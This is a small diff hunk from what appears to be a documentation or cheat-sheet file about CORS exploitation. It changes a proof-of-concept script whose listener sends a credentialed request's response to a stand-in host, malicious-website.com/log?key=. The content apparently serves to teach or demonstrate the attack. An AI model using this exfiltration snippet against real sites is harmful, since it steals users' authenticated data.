@@ -19,7 +19,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-	location='//malicious-website.com/log?key='+this.responseText;
+	location='https://malicious-website.com/log?key='+this.responseText;
 };
 </script>
 ```
